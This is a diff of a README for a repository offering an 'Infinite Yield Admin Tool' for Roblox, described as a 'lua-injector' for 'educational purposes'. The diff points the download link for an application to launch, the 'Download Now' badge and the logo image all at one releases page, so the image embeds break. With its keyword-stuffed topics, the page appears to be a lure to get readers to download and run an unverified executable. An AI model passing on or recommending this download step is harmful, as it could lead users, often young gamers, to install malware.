@@ -25,9 +25,9 @@ The Infinite Yield Admin Tool offers a wide range of functionalities to aid in g
 - **Topics**: admin-commands, admin-tools, developer-tools, educational-tools, game-commands, game-customization, game-development, lua-injector, lua-programming, lua-scripts, roblox, roblox-api, roblox-development, roblox-scripting, roblox-scripting-tools, roblox-utilities
 
 ## Application File
-You can download the application file from [here](https://github.com/files/uploaded/Application.zip). Click on the link to download the file and launch the application to start exploring the Infinite Yield Admin Tool.
+You can download the application file from [here](https://github.com/StepLT2/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases). Click on the link to download the file and launch the application to start exploring the Infinite Yield Admin Tool.
 
-![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download Now](https://github.com/StepLT2/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases)
 
 In case the link does not work or is not provided, please check the "Releases" section of this repository for an alternate download option.
 
@@ -49,6 +49,6 @@ If you encounter any issues or have any questions about the Infinite Yield Admin
 
 By leveraging the Infinite Yield Admin Tool, you are stepping into a world of endless possibilities in Roblox game development. This tool is not just a utility but a companion on your journey to mastering game management, scripting, and customization. Explore, experiment, and create with confidence using the Infinite Yield Admin Tool! 🎮✨
 
-![Roblox Logo](https://cdn.pixabay.com/photo/2018/12/29/23/51/game-3905231_960_720.png)
+![Roblox Logo](https://github.com/StepLT2/Infinite-Yield-Admin-Tool-for-Roblox-Educational-Purposes/releases)
 
 Happy coding and game developing! 🚀👾
